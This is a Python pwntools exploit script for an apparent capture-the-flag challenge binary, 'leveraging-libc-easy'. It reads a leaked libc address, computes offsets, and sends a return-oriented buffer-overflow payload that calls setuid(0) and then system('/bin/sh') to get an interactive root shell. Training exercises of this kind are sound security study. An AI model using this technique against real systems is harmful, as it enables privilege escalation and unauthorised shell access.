#!/usr/bin/env python3

from pwn import *

exe = ELF("/challenge/leveraging-libc-easy")

context.binary = exe

gdb_script = """
b *main
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    else:
        r = remote("addr", 1337)

        r = remote("addr", 1337)

    return r

offset = 40
pop_rdi = 0x402133
ret_gadget = 0x40101a

def main():
    r = conn()
    log.info(f"pid => {r.pid}")
    pause()
    # good luck pwning :)
    # [LEAK] The address of "system" in libc is: 0x7f7f5705d110.
    # now we need to filter this address and recieve it
    r.recvuntil(b"system\" in libc is: ")
    system_addr = int(r.recvline().strip()[:-1], 16)
    log.info(f"system address: {hex(system_addr)}")
    libc_base = system_addr - 0x52290
    log.info(f"libc base addr: {hex(libc_base)}")
    binsh = libc_base + 0x1b45bd
    log.info(f"binsh addr: {hex(binsh)}")
    set_uid = libc_base + 0xe4150
    payload = flat(
        b'A' * offset, 
        ret_gadget,
        pop_rdi,
        0,
        set_uid,
        ret_gadget,
        pop_rdi,
        binsh,
        system_addr
    )
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
